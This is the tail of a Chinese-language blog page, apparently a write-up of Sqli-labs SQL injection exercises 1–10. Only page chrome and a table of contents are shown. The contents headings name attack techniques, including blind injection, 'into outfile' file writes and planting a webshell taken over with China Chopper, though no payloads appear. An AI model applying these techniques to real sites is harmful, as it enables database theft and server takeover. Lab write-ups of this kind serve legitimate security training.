+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2019/08/10/Sqli-labs-GET Part 1-10/&title=《Sqli-labs-GET Part 1-10》 — DD's Blog&pic=https://ddstick.github.io/img/dd.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2019/08/10/Sqli-labs-GET Part 1-10/&title=《Sqli-labs-GET Part 1-10》 — DD's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/09/04/DVMA-File-Upload/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">DVMA-File-Upload</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/07/31/Upload-labs/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Upload-labs</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#安装"><span class="post-toc-number">1.</span> <span class="post-toc-text">安装</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Less-1：基于错误的-get-单引号-字符型注入"><span class="post-toc-number"></span> <span class="post-toc-text">Less-1：基于错误的_get_单引号_字符型注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Less-2：基于错误的-get-整型注入"><span class="post-toc-number"></span> <span class="post-toc-text">Less-2：基于错误的_get_整型注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Less-3：基于报错的-get-单引号-变形-字符型注入"><span class="post-toc-number"></span> <span class="post-toc-text">Less-3：基于报错的_get_单引号_变形_字符型注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Less-4：基于错误的-get-双引号-字符型注入"><span class="post-toc-number"></span> <span class="post-toc-text">Less-4：基于错误的_get_双引号_字符型注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#less-5：双注入-get-单引号-字符型注入"><span class="post-toc-number"></span> <span class="post-toc-text">less-5：双注入_get_单引号_字符型注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#双注入查询"><span class="post-toc-number">1.</span> <span class="post-toc-text">双注入查询</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Less-6：双注入-get-双引号-字符型注入"><span class="post-toc-number"></span> <span class="post-toc-text">Less-6：双注入_get_双引号_字符型注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Less-7：导出文件-get-字符型注入"><span class="post-toc-number"></span> <span class="post-toc-text">Less-7：导出文件_get_字符型注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#第一种，将小马写入文件中，用菜刀拿下："><span class="post-toc-number">1.</span> <span class="post-toc-text">第一种，将小马写入文件中，用菜刀拿下：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”"><span class="post-toc-number">2.</span> <span class="post-toc-text">第一种，构造select * from users into outfile “数据库导入导出数据的目录”</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Less-8：bool型-单引号-盲注"><span class="post-toc-number"></span> <span class="post-toc-text">Less-8：bool型_单引号_盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Less-8源码"><span class="post-toc-number">1.</span> <span class="post-toc-text">Less-8源码:</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#盲注常用函数-amp-amp-固有公式："><span class="post-toc-number">2.</span> <span class="post-toc-text">盲注常用函数&amp;&amp;固有公式：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#盲注脚本"><span class="post-toc-number">3.</span> <span class="post-toc-text">盲注脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Less-9基于时间的GET单引号盲注"><span class="post-toc-number"></span> <span class="post-toc-text">Less-9基于时间的GET单引号盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Less-9源码："><span class="post-toc-number">1.</span> <span class="post-toc-text">Less-9源码：</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Less-10-基于时间的双引号盲注"><span class="post-toc-number"></span> <span class="post-toc-text">Less-10 基于时间的双引号盲注</span></a>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.lujingtao.com" target="_blank">HOME</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                DD &copy; 2017 - 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2019/08/10/Sqli-labs-GET Part 1-10/&title=《Sqli-labs-GET Part 1-10》 — DD's Blog&pic=https://ddstick.github.io/img/dd.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2019/08/10/Sqli-labs-GET Part 1-10/&title=《Sqli-labs-GET Part 1-10》 — DD's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACH0lEQVR42u3aSXLEIAwFUN//0s4BOnF/IZwq4LFK9QTPC0UD1xWv+3Eln3/+5c9vXW8sDAyMZRnJEZ9fqR50bN8vO2JgYBzAGNv++XeS7f86en42DAwMjOfPVA+Up5UYGBgYswJuHmT7DwIDAwMjKSafGckh7ni9WItjYGAsyMi77v//9yvzDQwMjKUYd3F10sS8VVc+FQYGxtaMfistGQ90And+HgwMjL0ZnfKyMwDoD0dbaSIGBsZSjM4FiHwY2bkKFu2LgYGxKaOfFFafWb/cxcDAOI2RB7jqIcaCb2svDAyMTRnJRxNY/t1Zr1xVMQYGxrKM/JJodeg41s7Lw/Qv72JgYGzKyFO6zpZjRWzhdzAwMLZmVMNrNU0cGwkk/waiBBEDA2MLRn5hIj/cWLLYuWqGgYFxAiMPeW9crRgbLXzJcDEwMDZijLW38iBbaOsPkTAwME5gJF/IV+cpjo1CMTAwTmB00sE84I6VvtVrHxgYGOcwCk2uoeK2c2nsywkxMDAOY1Q3zltp1ZZcYWiKgYFxMCN/vX9dIw/u5U4hBgbGsoy7uKppYjm9qxauGBgYBzDmNv3zRDMP68nFNQwMjBMY/QIyaZyNjTkLzxsDA+MARh748oK2mlBOrsUxMDAw4nHCc6itXuZ4PeBiYGBsweg09KtFbOGhYGBgHMBIithqgTrrSuvkdhsGBsaCjLlF5qzxZPUhYmBgbMr4AaDeIuBhESfmAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+</body>
+</html>
